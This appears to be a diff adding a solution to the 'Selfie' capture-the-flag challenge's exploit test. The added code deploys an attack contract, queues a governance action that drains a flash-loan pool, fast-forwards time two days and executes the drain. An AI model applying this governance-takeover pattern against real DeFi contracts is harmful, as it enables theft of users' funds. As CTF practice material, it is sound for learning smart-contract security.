@@ -31,6 +31,21 @@ describe('[Challenge] Selfie', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        //deploy our attack contract
+        const attackFactory = await ethers.getContractFactory('SelfieAttack', attacker);
+        let selfieAttack = await attackFactory.deploy(this.pool.address, this.governance.address);
+
+        //now we queue the proposal for draining the funds from the flashloan pool
+        await selfieAttack.connect(attacker).queueDrainAction(TOKENS_IN_POOL);
+
+        //now wait for 2 days so that we can execute the queued proposal
+        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days
+
+        //finally we execute the drain funds action and get our tokens
+        await this.governance.connect(attacker).executeAction(1);
+
+
     });
 
     after(async function () {
